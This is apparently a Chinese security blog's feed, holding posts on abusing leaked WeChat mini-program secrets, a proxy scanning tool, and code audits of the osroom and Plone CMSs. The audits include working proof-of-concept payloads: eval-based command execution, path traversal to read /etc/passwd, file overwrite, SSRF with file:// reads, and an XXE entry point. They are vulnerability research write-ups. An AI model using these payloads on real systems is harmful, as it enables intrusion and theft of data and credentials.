href="https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad">https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad</a></p><p>执行：<code>python3 python.py wxid.wxapkg</code>，可以看到目录下生成的微信id的目录包。</p><p>或者使用：<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a>，一个nodejs的项目。提供Windows的安装版。</p><p>获取到小程序的源码格式包的时候，跟原来的源码还是稍微有点区别。在一级目录下，可以看到有三个文件，实际上不同的解包工具看到的不一样，有时候是四个文件。</p><pre class="line-numbers language-none"><code class="language-none">app-service.jsapp-config.jsonpage-frame.html&#x2F;&#x2F;app.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>app-service.js</code>是所以js的汇总，只是微信把js都压缩到这个js内。</p><p><code>app-config.json</code>: 小程序工程 <code>app.json</code> 以及各个页面的 JSON 配置文件汇总，可直接查看；</p><p><code>page-frame.html</code>: 所有页面的 <code>.wxml</code> 和 <code>app.wxss</code> 样式文件的汇总；</p><p><code>*.html</code>: 包含每个页面对应的 <code>.wxss</code> 信息，可读性较好；</p><p><code>static</code>: 各类图片、音频等资源文件。</p><p>获取解包后，小程序源码有什么用？</p><h2 id="小程序内的信息泄露"><a href="#小程序内的信息泄露" class="headerlink" title="小程序内的信息泄露"></a>小程序内的信息泄露</h2><p>有一部分开发者会把Appid和Secret放在小程序内请求，比如如下的开发者</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322161110075.png"></p><p>如果这个appid和secret可以使用，就能获取到seesion_key。借用官方的登陆流程。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/api-login.2fcc9f35.jpg" alt="img"></p><p>所以需要code和appid还有secret，code如何获取，只需要使用带有登陆功能的点，需要触发了wx.login()功能，点击登陆抓包即可。</p><p>一般打开小程序的时候就有流量交互了。比如，但这个code只能使用一次</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322162950522.png" alt="image-20210322162950522"></p><p>构造一个请求，查看小程序官方文档：<a href="https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/login/auth.code2Session.html">https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/login/auth.code2Session.html</a></p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;sns&#x2F;jscode2session?appid&#x3D;wxxxxx&amp;secret&#x3D;568wdxxx&amp;js_code&#x3D;041xxxx&amp;grant_type&#x3D;authorization_code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了方便，此处使用云函数功能测试，需要小程序开启云函数。使用python的第三方包<code>python-weixin</code>。但云函数功能不一定都开放，需要小程序开放才能查询。</p><pre class="line-numbers language-none"><code class="language-none">from os import environ, pathfrom weixin import WxAppCloudAPI​appid &#x3D; environ.get(&quot;WXAPP_APPID&quot;, &quot;wx88xxxxx&quot;)secret &#x3D; environ.get(&quot;WXAPP_SECRET&quot;, &quot;56xxxxx&quot;)env &#x3D; &quot;test-id&quot;​example_db &#x3D; path.abspath(path.join(path.dirname(__file__), &quot;.&#x2F;example_db&quot;))app_cloud &#x3D; WxAppCloudAPI(    appid&#x3D;appid, app_secret&#x3D;secret, grant_type&#x3D;&quot;client_credential&quot;)token &#x3D; app_cloud.client_credential_for_access_token().get(&quot;access_token&quot;)print(token)​cloud_api &#x3D; WxAppCloudAPI(access_token&#x3D;token)# 获取库的集合信息db_info &#x3D; cloud_api.db_collection_info(json_body&#x3D;&#123;&quot;env&quot;: env, &quot;limit&quot;: 10&#125;)print(db_info)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据包的wiki来利用云函数操作小程序，文档：<a href="https://github.com/gusibi/python-weixin/wiki/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BA%91%E5%BC%80%E5%8F%91">https://github.com/gusibi/python-weixin/wiki/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BA%91%E5%BC%80%E5%8F%91</a></p><h3 id="利用accesstoken"><a href="#利用accesstoken" class="headerlink" title="利用accesstoken"></a>利用accesstoken</h3><p>获取session_key是用户数据的加密密钥，那accesstoken就是操作小程序的调用凭证。</p><p>先获取accesstoken，也可以利用上面提到的代码来获取accesstoken。</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;token?grant_type&#x3D;client_credential&amp;appid&#x3D;APPID&amp;secret&#x3D;APPSECRET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到token后可以利用官方的接口操作小程序来查询等操作，比如查询最近一天的访问</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;datacube&#x2F;getweanalysisappidvisitpage?access_token&#x3D;ACCESS_TOKENdata &#x3D; &#123;&quot;begin_date&quot; : &quot;20170313&quot;,&quot;end_date&quot; : &quot;20170313&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他查询接口查看：<a href="https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/access-token/auth.getAccessToken.html">https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/access-token/auth.getAccessToken.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;认识微信小程序&quot;&gt;&lt;a href=&quot;#认识微信小程序&quot; class=&quot;headerlink&quot; title=&quot;认识微信小程序&quot;&gt;&lt;/a&gt;认识微信小程序&lt;/h2&gt;&lt;p&gt;此处使用Windows版微信做介绍，但是Windows版和手机版稍微有点区别。先去获取一个Windo
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>又叒一个代理扫描平台</title>
    <link href="https://misakikata.github.io/2021/01/%E5%8F%88%E5%8F%92%E4%B8%80%E4%B8%AA%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F%E5%B9%B3%E5%8F%B0/"/>
    <id>https://misakikata.github.io/2021/01/又叒一个代理扫描平台/</id>
    <published>2021-01-13T08:25:40.000Z</published>
    <updated>2021-01-13T08:35:48.644Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于项目"><a href="#关于项目" class="headerlink" title="关于项目"></a>关于项目</h2><ol><li> 项目是一个代理扫描器，现有的代理扫描平台有xray，w13scan等，只是我希望关于SQL注入的使用sqlmap来检测执行，所以就有了这个平台，本质上和GroudScan是差不多的，只是把w13scan也加入到其中来检测别的漏洞。</li><li> 同时也期望这个东西能做到代理扫描上的统一化，在实际工作中，开发测试对于新功能并不会实时进行安全申报，所以希望平台化的被动扫描可以帮助实现安全的加固。</li><li> 地址：<a href="https://github.com/MisakiKata/mitescan">https://github.com/MisakiKata/mitescan</a></li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>环境使用MySQL，建议手动调整连接超时时间，代码会检测连接是否超时，但是可以调整超时来延缓长连接。不修改本质上也没事。</li><li>安装，基于python3.7</li></ol><pre class="line-numbers language-none"><code class="language-none">mitmproxyapschedulerdjango-apschedulerdjango&#x3D;&#x3D;2.2.10django-simpleuiPyMySQLsecretsasn1crypto&#x3D;&#x3D;0.24.0certifi&#x3D;&#x3D;2019.6.16cffi&#x3D;&#x3D;1.12.3chardet&#x3D;&#x3D;3.0.4colorama&#x3D;&#x3D;0.4.1cowpy&#x3D;&#x3D;1.1.0cryptography&#x3D;&#x3D;2.7cssselect&#x3D;&#x3D;1.1.0idna&#x3D;&#x3D;2.8lxml&#x3D;&#x3D;4.5.0pycparser&#x3D;&#x3D;2.19pyjsparser&#x3D;&#x3D;2.7.1pyOpenSSL&#x3D;&#x3D;18.0.0PySocks&#x3D;&#x3D;1.7.1requests&#x3D;&#x3D;2.24.0requests-toolbelt&#x3D;&#x3D;0.9.1six&#x3D;&#x3D;1.12.0tld&#x3D;&#x3D;0.9.3urllib3&#x3D;&#x3D;1.25.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li> 代理模块使用mitmproxy，如果需要代理https，请在开启代理后访问地址<code>http://mitm.it/</code>下载证书，默认代理为<code>0.0.0.0:18088</code>。如需修改在myproxy/myproxys.py中修改。</li><li> 需要开启sqlmapapi</li></ol><pre class="line-numbers language-none"><code class="language-none">python sqlmapapi.py -s <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li> 为了避免流量数据堆积，只显示最近三天的流量，检索也是按照最近三天检索，如果需要修改<code>apps/proxy/views.py</code>中修改<code>timedelta(days=3)</code>为想要的天数。</li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>配置setting的数据库信息</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">python manage.py makemigrationspython manage.py migrate python manage.py createsuperuserpython manage.py runserver 0.0.0.0:8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问地址ip:8000即可，如需维持进程，可以使用supervisor。</p><h4 id="监控前台"><a href="#监控前台" class="headerlink" title="监控前台"></a>监控前台</h4><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112111910805.png" alt="image-20210112111910805"></p><h4 id="监控选项"><a href="#监控选项" class="headerlink" title="监控选项"></a>监控选项</h4><p>注入的结果使用的<code>apscheduler</code>任务框架来定时检索，默认是一分钟执行一次。所以请开启，不然不会检查是否注入完成。如果需要修改时间请到<code>apps/sqli/views.py</code>中，修改<code>minutes=1</code>为需要的分钟。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112112450179.png" alt="image-20210112112450179"></p><h4 id="代理数据"><a href="#代理数据" class="headerlink" title="代理数据"></a>代理数据</h4><p>关于搜索，需要输入请求的地址和端口来检测，也可以只输入一个值，但如果是ip加端口的形式，需要分开来一起搜索。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112111940503.png" alt="image-20210112111940503"></p><h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p>请在其中添加修改需要过滤的代理请求关键词，所有添加的参数都会按照并集来处理。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112111959302.png" alt="image-20210112111959302"></p><h4 id="SQL注入监控"><a href="#SQL注入监控" class="headerlink" title="SQL注入监控"></a>SQL注入监控</h4><p>菜单下的注入设置同上。等待已完成查看结果即可，需要右上角刷新页面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112112110829.png" alt="image-20210112112110829"></p><h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4><p>此漏洞为w13scan扫描结果漏洞展示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112112302619.png" alt="image-20210112112302619"></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>此项目主要是融合利用，存在的已知问题是：稳定性暂时没有经过大流量的测试，只是单纯的个人使用无误。如果存在其他问题，还请表哥issue。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于项目&quot;&gt;&lt;a href=&quot;#关于项目&quot; class=&quot;headerlink&quot; title=&quot;关于项目&quot;&gt;&lt;/a&gt;关于项目&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt; 项目是一个代理扫描器，现有的代理扫描平台有xray，w13scan等，只是我希望关于SQL注入的使用sqlma
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--osroom</title>
    <link href="https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-osroom/"/>
    <id>https://misakikata.github.io/2020/11/代码审计-osroom/</id>
    <published>2020-11-20T07:24:45.000Z</published>
    <updated>2020-11-20T07:26:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="osroom"><a href="#osroom" class="headerlink" title="osroom"></a>osroom</h2><p>这个cms很有意思，从漏洞和程序的写法上，很适合用来入门学习，漏洞的一些形式相比来说，也比较多一点。</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><code>apps\utils\format\obj_format.py</code></p><p>如下，文件中采用了eval来转换字符串对象，当json.loads转换失败的时候，则直接使用eval来转换。</p><pre class="line-numbers language-none"><code class="language-none">def json_to_pyseq(tjson):    &quot;&quot;&quot;    json to python sequencer    :param json:    :return:    &quot;&quot;&quot;    if tjson in [None, &quot;None&quot;]:        return None    elif not isinstance(tjson, (list, dict, tuple)) and tjson !&#x3D; &quot;&quot;:        if isinstance(tjson, (str, bytes)) and tjson[0] not in [&quot;&#123;&quot;, &quot;[&quot;, &quot;(&quot;]:            return tjson        elif isinstance(tjson, (int, float)):            return tjson        try:            tjson &#x3D; json.loads(tjson)        except BaseException:            tjson &#x3D; eval(tjson)        else:            if isinstance(tjson, str):                tjson &#x3D; eval(tjson)    return tjson<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转到一个使用此方法的功能，例如<code>apps\modules\audit\process\rules.py</code></p><p>删除规则处，传入一个ids参数，原参数值是一个hash值，但是可以修改为python代码。</p><pre class="line-numbers language-none"><code class="language-none">def audit_rule_delete():    ids &#x3D; json_to_pyseq(request.argget.all(&#39;ids&#39;, []))    if not isinstance(ids, list):        ids &#x3D; json.loads(ids)    for i, tid in enumerate(ids):        ids[i] &#x3D; ObjectId(tid)    r &#x3D; mdbs[&quot;sys&quot;].db.audit_rules.delete_many(&#123;&quot;_id&quot;: &#123;&quot;$in&quot;: ids&#125;&#125;)    if r.deleted_count &gt; 0:        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;Delete the success,&#123;&#125;&quot;).format(            r.deleted_count), &quot;msg_type&quot;: &quot;s&quot;, &quot;custom_status&quot;: 204&#125;    else:        data &#x3D; &#123;            &quot;msg&quot;: gettext(&quot;Delete failed&quot;),            &quot;msg_type&quot;: &quot;w&quot;,            &quot;custom_status&quot;: 400&#125;    return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数POC：<code> &#123;123:__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#125;</code>，查看终端输出。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112124711645.png" alt="image-20201112124711645"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112121033287.png" alt="image-20201112121033287"></p><p>只要涉及到ids参数的都存在此问题，比如另一个类别删除功能。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112133809406.png" alt="image-20201112133809406"></p><p>在用户登陆的判断中，也对传入的参数<code>code_url_obj</code>执行了此方法，所以存在一个前台的RCE</p><p><code>apps\modules\user\process\online.py</code></p><pre class="line-numbers language-none"><code class="language-none">code_url_obj &#x3D; json_to_pyseq(request.argget.all(&#39;code_url_obj&#39;, &#123;&#125;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112162057637.png" alt="image-20201112162057637"></p><h3 id="文件覆盖"><a href="#文件覆盖" class="headerlink" title="文件覆盖"></a>文件覆盖</h3><p><code>apps\utils\upload\file_up.py</code></p><p>ps: 此问题没有复现，理论上存在。</p><p>代码描述了一种上传typroa图像base64后处理来保存写入文件的方式，其中后缀是解析typroa图像base64开头得到，例如</p><p><code>data:image/jpg;base64,</code>获得后缀为jpg，在后续的文件明拼接中，文件名被以时间戳和UUID重写构造，但是后缀可控，可以写入<code>..\..\</code>形式的遍历<code>data:image/jpg\..\..\..\..\tmp;base64</code></p><pre class="line-numbers language-none"><code class="language-none">def fileup_base_64(uploaded_files, file_name&#x3D;None, prefix&#x3D;&quot;&quot;):    &quot;&quot;&quot;     文件以base64编码上传上传    :param uploaded_files: 数组    :param bucket_var: 保存typroa图像服务器空间名的变量名, 如AVA_B    :param file_name:    :return:    &quot;&quot;&quot;    if not uploaded_files:        return None    keys &#x3D; []    for file_base in uploaded_files:        if file_base:            # data:image&#x2F;jpeg            file_format &#x3D; file_base.split(&quot;;&quot;)[0].split(&quot;&#x2F;&quot;)[-1]            imgdata &#x3D; base64.b64decode(file_base.split(&quot;,&quot;)[-1])            if file_name:                filename &#x3D; &#39;&#123;&#125;.&#123;&#125;&#39;.format(file_name, file_format)            else:                filename &#x3D; &#39;&#123;&#125;_&#123;&#125;.&#123;&#125;&#39;.format(                    time_to_utcdate(                        time_stamp&#x3D;time.time(),                        tformat&#x3D;&quot;%Y%m%d%H%M%S&quot;),                    uuid1(),                    file_format)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入后可以造成一种保存文件到其他目录的效果，这种遍历在Linux下是不允许的，但在Windows下可执行，win支持及<code>../</code>和<code>..\</code>，还可以文件结尾的回退遍历，所以在Windows下可以造成覆写。</p><p>由于兼容性，Windows下有个别的包兼容有问题，并没有复现，附一张Linux的目录构造图</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112155343443.png" alt="image-20201112155343443"></p><h3 id="上传文件覆盖"><a href="#上传文件覆盖" class="headerlink" title="上传文件覆盖"></a>上传文件覆盖</h3><p>如果上面那个不是很清楚，这个就比较明显了，插件上传功能中。</p><p><code>apps\modules\plug_in_manager\process\manager.py</code></p><pre class="line-numbers language-none"><code class="language-none">def upload_plugin():    &quot;&quot;&quot;    插件上传    :return:    &quot;&quot;&quot;    file &#x3D; request.files[&quot;upfile&quot;]    file_name &#x3D; os.path.splitext(file.filename)         #(&#39;123&#39;,&#39;.zip&#39;)    filename &#x3D; os.path.splitext(file.filename)[0]         #123    extension &#x3D; file_name[1]                           #.zip    if not extension.strip(&quot;.&quot;).lower() in [&quot;zip&quot;]:        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File format error, please upload zip archive&quot;),                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 401&#125;        return data    if not os.path.exists(PLUG_IN_FOLDER):            #osroom&#x2F;apps&#x2F;plugins        os.makedirs(PLUG_IN_FOLDER)    fpath &#x3D; os.path.join(PLUG_IN_FOLDER, filename)   ##osroom&#x2F;apps&#x2F;plugins&#x2F;123    if os.path.isdir(fpath) or os.path.exists(fpath):        if mdbs[&quot;sys&quot;].db.plugin.find_one(                &#123;&quot;plugin_name&quot;: filename, &quot;is_deleted&quot;: &#123;&quot;$in&quot;: [0, False]&#125;&#125;):            # 如果插件没有准备删除标志            data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;The same name plugin already exists&quot;),                    &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 403&#125;            return data        else:            # 否则清除旧的插件            shutil.rmtree(fpath)            mdbs[&quot;sys&quot;].db.plugin.update_one(&#123;&quot;plugin_name&quot;: filename&#125;, &#123;                                         &quot;$set&quot;: &#123;&quot;is_deleted&quot;: 0&#125;&#125;)    # 保存主题    save_file &#x3D; os.path.join(&quot;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(PLUG_IN_FOLDER, file.filename))     ##osroom&#x2F;apps&#x2F;plugins&#x2F;123.zip    file.save(save_file)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传文件后分割文件和后缀，判断插件是否存在以及是否清理就插件，在下面保存的时候，直接使用了上传的参数名做拼接，导致可以被跨目录保存，比如文件应该保存到<code>osroom/apps/plugins/</code>下，上传如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201113142316180.png" alt="image-20201113142316180"></p><p>我们在系统查看</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201113142402087.png" alt="image-20201113142402087"></p><h3 id="路径跳转"><a href="#路径跳转" class="headerlink" title="路径跳转"></a>路径跳转</h3><p><code>apps\modules\user\process\sign_in.py</code></p><p>ps：此问题影响较小，当作分析即可</p><p>在代码中存在一个获取值的参数<code>next</code>，这个参数是登陆的时候默认没有存在，可能是为了跳转登陆留下的参数。参数值为任意值的时候，返回的<code>to_url</code>的值就为参数值。</p><pre class="line-numbers language-none"><code class="language-none">def p_sign_in(        username,        password,        code_url_obj,        code,        remember_me,        use_jwt_auth&#x3D;0):    &quot;&quot;&quot;    用户登录函数    :param adm:    :return:    &quot;&quot;&quot;    data &#x3D; &#123;&#125;    if current_user.is_authenticated and username in [current_user.username,                                                      current_user.email,                                                      current_user.mphone_num]:        data[&#39;msg&#39;] &#x3D; gettext(&quot;Is logged in&quot;)        data[&quot;msg_type&quot;] &#x3D; &quot;s&quot;        data[&quot;custom_status&quot;] &#x3D; 201        data[&#39;to_url&#39;] &#x3D; request.argget.all(            &#39;next&#39;) or get_config(&quot;login_manager&quot;, &quot;LOGIN_IN_TO&quot;)        return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在前端js中<code>apps\admin_pages\pages\sign-in.html</code></p><p>直接获取响应的data的to_url进行跳转，类似于统一登陆中的任意域跳转的问题。</p><pre class="line-numbers language-none"><code class="language-none">var result &#x3D; osrHttp(&quot;PUT&quot;,&quot;&#x2F;api&#x2F;sign-in&quot;, d);      result.then(function (r) &#123;             if(r.data.msg_type&#x3D;&#x3D;&quot;s&quot;)&#123;                 window.location.href &#x3D; r.data&#x2F;to_url;             &#125;else if(r.data.open_img_verif_code)&#123;                 get_imgcode();             &#125;      &#125;).catch(function (r) &#123;         if(r.data.open_img_verif_code)&#123;             get_imgcode();         &#125;      &#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>apps\modules\theme_setting\process\static_file.py</code></p><p>读取静态文件模板的时候，直接使用了请求的参数进行拼接访问，导致可以任意读取文件</p><pre class="line-numbers language-none"><code class="language-none">def get_static_file_content():    &quot;&quot;&quot;    获取静态文件内容, 如html文件    :return:    &quot;&quot;&quot;    filename &#x3D; request.argget.all(&#39;filename&#39;, &quot;index&quot;).strip(&quot;&#x2F;&quot;)    file_path &#x3D; request.argget.all(&#39;file_path&#39;, &quot;&quot;).strip(&quot;&#x2F;&quot;)    theme_name &#x3D; request.argget.all(&quot;theme_name&quot;)    s, r &#x3D; arg_verify([(gettext(&quot;theme name&quot;), theme_name)], required&#x3D;True)    if not s:        return r    path &#x3D; os.path.join(        THEME_TEMPLATE_FOLDER, theme_name)    file &#x3D; &quot;&#123;&#125;&#x2F;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(path, file_path, filename)    if not os.path.exists(file) or THEME_TEMPLATE_FOLDER not in file:        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File not found,&#39;&#123;&#125;&#39;&quot;).format(file),                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 404&#125;    else:        with open(file) as wf:            content &#x3D; wf.read()        data &#x3D; &#123;            &quot;content&quot;: content,            &quot;file_relative_path&quot;: file_path.replace(                path,                &quot;&quot;).strip(&quot;&#x2F;&quot;)&#125;    return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造POC：<code>http://192.168.120.128:5000/api/admin/static/file?file_path=pages/account/settings/../../../../../../../../etc&amp;filename=passwd&amp;theme_name=osr-theme-w</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112174207578.png" alt="image-20201112174207578"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;osroom&quot;&gt;&lt;a href=&quot;#osroom&quot; class=&quot;headerlink&quot; title=&quot;osroom&quot;&gt;&lt;/a&gt;osroom&lt;/h2&gt;&lt;p&gt;这个cms很有意思，从漏洞和程序的写法上，很适合用来入门学习，漏洞的一些形式相比来说，也比较多一点。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--Plone</title>
    <link href="https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Plone/"/>
    <id>https://misakikata.github.io/2020/11/代码审计-Plone/</id>
    <published>2020-11-18T01:32:02.000Z</published>
    <updated>2020-11-18T01:35:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Plone"><a href="#Plone" class="headerlink" title="Plone"></a>Plone</h2><p>Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这个查看起来查找对应功能实在是费劲。</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><code>plone.app.event-3.2.7-py3.6.egg\plone\app\event\ical\importer.py</code></p><pre class="line-numbers language-none"><code class="language-none">@button.buttonAndHandler(u&#39;Save and Import&#39;)    def handleSaveImport(self, action):        data, errors &#x3D; self.extractData()        if errors:            return False        self.save_data(data)        ical_file &#x3D; data[&#39;ical_file&#39;]        ical_url &#x3D; data[&#39;ical_url&#39;]        event_type &#x3D; data[&#39;event_type&#39;]        sync_strategy &#x3D; data[&#39;sync_strategy&#39;]        if ical_file or ical_url:            if ical_file:                # File upload is not saved in settings                ical_resource &#x3D; ical_file.data                ical_import_from &#x3D; ical_file.filename            else:                ical_resource &#x3D; urllib.request.urlopen(ical_url).read()                ical_import_from &#x3D; ical_url            import_metadata &#x3D; ical_import(                self.context,                ics_resource&#x3D;ical_resource,                event_type&#x3D;event_type,                sync_strategy&#x3D;sync_strategy,            )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上所述，在读取参数<code> ical_url</code>时，根据程序设置是导入该事件的<code> icalendar</code>资源文件，但对如何读取资源文件没有限制，可以直接使用urllib包进行读取和返回</p><p>在Members功能下的<code>Action</code>中选择<code>Enable icalendar import</code>后，配置<code>Icalendar URL</code>参数。</p><p>参数：<code>http://127.0.0.1:22</code>，执行<code>Save and Import</code>。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109094919974.png" alt="image-20201109094919974"></p><p>urllib还支持文件协议，因此也可以用于文件读取</p><p>参数: <code>file:///proc/self/environ</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109100807462.png" alt="image-20201109100807462"></p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\browser\records.py</code></p><pre class="line-numbers language-none"><code class="language-none">def import_registry(self):        try:            fi &#x3D; self.request.form[&#39;file&#39;]            body &#x3D; fi.read()        except (AttributeError, KeyError):            messages &#x3D; IStatusMessage(self.request)            messages.add(u&quot;Must provide XML file&quot;, type&#x3D;u&quot;error&quot;)            body &#x3D; None        if body is not None:            importer &#x3D; RegistryImporter(self.context, FakeEnv())            try:                importer.importDocument(body)            except XMLSyntaxError:                messages &#x3D; IStatusMessage(self.request)                messages.add(u&quot;Must provide valid XML file&quot;, type&#x3D;u&quot;error&quot;)        return self.request.response.redirect(self.context.absolute_url())<span aria-hidden="true" 